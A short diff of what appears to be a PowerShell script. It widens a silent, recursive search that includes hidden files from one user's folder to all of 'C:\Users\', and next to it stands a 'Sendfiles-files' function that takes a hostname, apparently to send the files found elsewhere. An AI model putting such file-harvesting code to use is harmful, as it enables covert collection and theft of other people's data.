@@ -8,7 +8,7 @@
 
 function Search-files
 {
-    $global:resultSearch = Get-ChildItem -Path "C:\Users\admin2" -Include *.* -Force -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "MATCH" } | Select -exp FullName   
+    $global:resultSearch = Get-ChildItem -Path "C:\Users\" -Include *.* -Force -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "MATCH" } | Select -exp FullName   
 }    
 
 function Sendfiles-files ($content, $filename, $hostname)
